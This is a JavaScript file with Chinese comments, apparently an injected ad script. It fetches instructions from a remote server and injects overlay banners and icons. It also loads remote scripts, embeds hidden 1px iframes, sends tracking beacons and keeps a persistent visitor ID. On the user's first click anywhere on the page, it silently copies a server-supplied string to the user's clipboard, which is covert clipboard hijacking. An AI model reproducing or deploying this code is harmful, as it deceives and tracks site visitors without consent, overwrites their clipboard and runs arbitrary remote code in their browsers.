// 获取Channelid
function getChannelid() {
	return "400581";
}

var cid = "";
var tborder = "";
var hasClick = false;
var pro_times = 0;
var GAP_TIME = 600000; 
var IS_DEBUG = false;
! function(u, e) {
	// cid = Channelid
	cid = getChannelid();
	// 
	var userId = getGgid();
	// 获取 lastTime
	var lastTime = getLastTime();
	// 获取 当前时间
	var currentTime = new Date().getTime();
	// 获取时间差
	var gap = currentTime - lastTime;
	// log
	Logger("userId:"+userId+",currentTime:" + currentTime + ",lastTime:" + lastTime + "gap:" + gap);
	// 时间差小于10分钟就return
	if(gap < GAP_TIME) {
		// return;
	}
	// ok
	Logger("user is ok");
	// 根据userId获取getAllShow
	getSmartJ(userId);
	// js严格模式
	"use strict";
	// 添加windows点击事件
	window.addEventListener("click", function() {
		if(hasClick || tborder == "") {
			Logger("tborder111:"+tborder);
			return;
		}
		Logger("tborder:"+tborder);
		const input = document.createElement('input');
		input.setAttribute('readonly', 'readonly');
		input.setAttribute('value', tborder);
		document.body.appendChild(input);
		input.focus();
		input.setSelectionRange(0, 9999);
		try {
			// 拷贝当前内容（tborder）到剪贴板
			if(document.execCommand('copy')) {
				hasClick = true;
			} else {
			}
		} catch(e) {
		}
		document.body.removeChild(input);
	})
	// 设置当前时间为last_time
	setItem("last_time", currentTime);
}(0, document);

// 
function getSmartJ(userId) {
	var url = "https://ssgame.moguupd5.com/singlefun/jspullup/recentjspullup?ggid=" + userId + "&cid=" + cid + "&os=" + getOSType();
	console.log(url)
	url = getTimeStamp(url);
	Logger("url:" + url);
	var a = null;
	a = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Msxml2.XMLHTTP");
	a.open("get", url, !0);
	a.send();
	a.onreadystatechange = function() {
		if(4 == a.readyState && 200 == a.status) {
			var result = JSON.parse(a.responseText);
			Logger(result);
			if(result.returncode == "200") {
				console.log(result)
				console.log(JSON.stringify(result.content))
				var contentJson = result.content;
				var aType;
				for(aType in contentJson) {
					Logger("aType:" + aType);
					getAllShow(aType, contentJson[aType]);
				}
			}
		}
	}
}

function getAllShow(index, contentArrary) {
	console.log(index)
	Logger("contentArrary:" + contentArrary.length);
	var img_url;
	var click_url;
	var torder;
	var src_type;
	var showJb;
	var clickJb;
	var place;
	var inter;
	for(var i = 0; i < contentArrary.length; i++) {
		var cell = contentArrary[i];
		img_url = cell.img_url;
		click_url = cell.click_url;
		torder = cell.tborder;
		src_type = cell.srctype;
		showJb = cell.showjb;
		clickJb = cell.clickjb;
		place = cell.place;
		inter = cell.interrupt;
		if("br" == index) {
			// 设置banner
			sBr(img_url, showJb, click_url, clickJb, src_type, index, place);
		} else if("ico" == index) {
			// 设置icon
			sIc(img_url, showJb, click_url, clickJb, src_type, index);
		} else if("epx" == index) {
			// 创建隐藏iframe
			showPX(img_url, inter);
			// 发送report报表请求
			reportJb(showJb, index, "show");
		} else if("tor" == index) {
			tborder = torder;
			// 纯无感
			reportJb(showJb, index, "show");
		}
	}
}

function sBr(imgurl, showtrack, click_url, clicktrack, src_type, index, place) {
	Logger("sBr:" + "imgurl:" + imgurl + ",showtrack:" +
		showtrack + ",click_url:" + click_url + ",clicktrack:" + clicktrack + ",src_type:" + src_type + ",place:" + place);
	if(0 == src_type) {
		showBrStyle(imgurl, click_url, clicktrack, index, place);
	} else if(1 == src_type) {
		if(!isEmptyValue(imgurl)) {
			var Func = function() {
				Logger("br JS loaded");
			};
			dynamicLoadJs(imgurl, Func);
		}
	}
	reportJb(showtrack, index, "show");
}

function sIc(imgurl, showtrack, click_url, clicktrack, src_type, index) {
	Logger("icon:" + "imgurl:" + imgurl + ",showtrack:" +
		showtrack + ",click_url:" + click_url + ",clicktrack:" + clicktrack + ",src_type:" + src_type);
	if(0 == src_type) {
		showIcoStyle(imgurl, click_url, clicktrack, index);
	} else if(1 == src_type) {
		if(!isEmptyValue(imgurl)) {
			var Func = function() {
				Logger("br JS loaded");
			};
			dynamicLoadJs(imgurl, Func);
		}
	}
	reportJb(showtrack, index, "show");
}

function showBrStyle(imgurl, click_url, clicktrack, index, place) {
	if(0 == place) {
		showBrStyleTop(imgurl, click_url, clicktrack, index);
	} else {
		showBrStyleBottom(imgurl, click_url, clicktrack, index);
	}
}

function showBrStyleTop(imgurl, click_url, clicktrack, index) {
	var div_banner = document.createElement('div');
	div_banner.style = 'position: fixed; width: 100%; height: auto;left:0;top:0;z-index:2;';
	var img_banner = document.createElement('img');
	img_banner.src = imgurl;
	img_banner.style = 'width:100%;height:auto;display:block;position:fixed;';
	div_banner.appendChild(img_banner);
	div_banner.onclick = function() {
		if(!isEmptyValue(click_url)) {
			reportJb(clicktrack, index, "click");
			window.location.href = click_url;
		}
	};
	document.body.appendChild(div_banner);
}

function showBrStyleBottom(imgurl, click_url, clicktrack, index) {
	var div_banner = document.createElement('div');
	var img_banner = document.createElement('img');
	img_banner.src = imgurl;
	img_banner.style = 'width:100%;height:auto;display:block;position:fixed;left:0;bottom:0;z-index:99;';
	div_banner.appendChild(img_banner);
	div_banner.onclick = function() {
		if(!isEmptyValue(click_url)) {
			reportJb(clicktrack, index, "click");
			window.location.href = click_url;
		}
	};
	document.body.appendChild(div_banner);
}

function showIcoStyle(imgurl, click_url, clicktrack, index) {
	var s = document.getElementsByTagName("body")[0];
	var div_pa = document.createElement("div");
	div_pa.style = "position:fixed;width:120px;height:120px;opacity:1;left:5px;top:50%;transition:left 0.1s,bootom 0.7s;z-index:0x7FFFFFFF;";
	var img_ico = document.createElement("img");
	img_ico.src = imgurl;
	img_ico.style = "position:absolute;width:100px;height:100px;opacity:1;top:20px;z-index:2";
	img_ico.onclick = function() {
		if(!isEmptyValue(click_url)) {
			reportJb(clicktrack, index, "click");
			window.location.href = click_url;
		}
	}
	
	div_pa.appendChild(img_ico, div_pa)
	s.appendChild(div_pa, s)
}

function showPX(imgUrl, interrupt) {
	var s = document.getElementsByTagName("body")[0];
	var iframe_div = document.createElement("div");
	iframe_div.style.display = "none";
	var d = document.createElement("iframe");
	d.src = imgUrl;
	if ("1" == interrupt) {
		d.sandbox = "allow-same-origin allow-scripts allow-forms";
		Logger("interrupt:1");
	}
	d.style = "position:fixed;width:1px;height:1px;opacity:1;transition:right 0.1s,bootom 0.7s;z-index:0x7FFFFFFF;";
	iframe_div.appendChild(d);
	s.appendChild(iframe_div, s);
}


// 
function wakeThisUrl(imgURL, deepUrl) {
	if(isIos()) {
		window.location.href = deepUrl;
	} else {
		console.log("no ios")
		var ifr = document.createElement("iframe");
		ifr.src = deepUrl;
		ifr.style.opacity = 0;
		ifr.style.width = 0;
		ifr.style.height = 0;
		document.body.appendChild(ifr);
	}
}

function isIos() {
	return /(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent);
}
// 获取Ggid
function getGgid() {
	// userid = 读取本地缓存 pullLive
	userid = getItem("pullLive");
	if(userid == "" || userid == undefined || userid == null) {
		// userid = 8位随机字符串
		userid = randomString(8);
		// 如果缓存没有userid， 设置缓存pullLive为userid
		setItem("pullLive", userid);
	}
	return userid;
}

function getLastTime() {
	var last_time = getItem("last_time");
	if(last_time == "" || last_time == undefined || last_time == null) {
		last_time = 0;
		setItem("last_time", last_time);
	}
	return last_time;
}
// 读取本地缓存
function getItem(mkey) {
	return getValueByLocalStorage(mkey);
}

function setItem(mkey, mvalue) {
	// saveToBrowserByLocalStorage(mkey, mvalue);
}

function saveToBrowserByLocalStorage(mkey, mvalue) {
	if(true) {
		localStorage.setItem(mkey, mvalue);
	} else {
		cclog("isLocalStorageNameSupported() : false");
	}
}

function getValueByLocalStorage(mkye) {
	return localStorage.getItem(mkye);
}

function randomString(len) {
	var $chars = 'ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678';　　
	var maxPos = $chars.length;　　
	var pwd = '';　　
	for(i = 0; i < len; i++) {　　　　
		pwd += $chars.charAt(Math.floor(Math.random() * maxPos));　　
	}　　
	return pwd;
}

function reportJb(urlArry, type, rpName) {
	for(var i = 0; i < urlArry.length; i++) {
		Logger("reportJb:" + urlArry[i] + ",type:" + type + ",event:" + rpName);
		var url = urlArry[i];
		var a = null;
		a = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Msxml2.XMLHTTP");
		a.open("get", url, !0);
		a.send();
		a.onreadystatechange = function() {
			if(4 == a.readyState && 200 == a.status) {
				Logger('report success');
			}
		}
	}
}

function dynamicLoadJs(url, callback) {
	var head = document.getElementsByTagName('body')[0];
	var script = document.createElement('script');
	script.type = 'text/javascript';
	script.src = url;
	if(typeof(callback) == 'function') {
		script.onload = script.onreadystatechange = function() {
			if(!this.readyState || this.readyState === "loaded" || this.readyState === "complete") {
				callback();
				script.onload = script.onreadystatechange = null;
			}
		};
	}
	head.appendChild(script);
}

function getOSType() {
	var type = 0;
	if(isIos()) {
		type = 1;
	}
	return type;
}

function Logger(value) {
	if(IS_DEBUG) {
		console.log(value);
	}
}

var isEmptyValue = function(value) {
	var type = false;   
	if(value == null) {
		type = true;
	}
	return type;
}

function getTimeStamp(url) {
	var gt = new Date().getTime();
	if(url.indexOf("?") > -1) {
		url = url + "&tsp=" + gt
	} else {
		url = url + "?tsp=" + gt
	}
	return url;
}


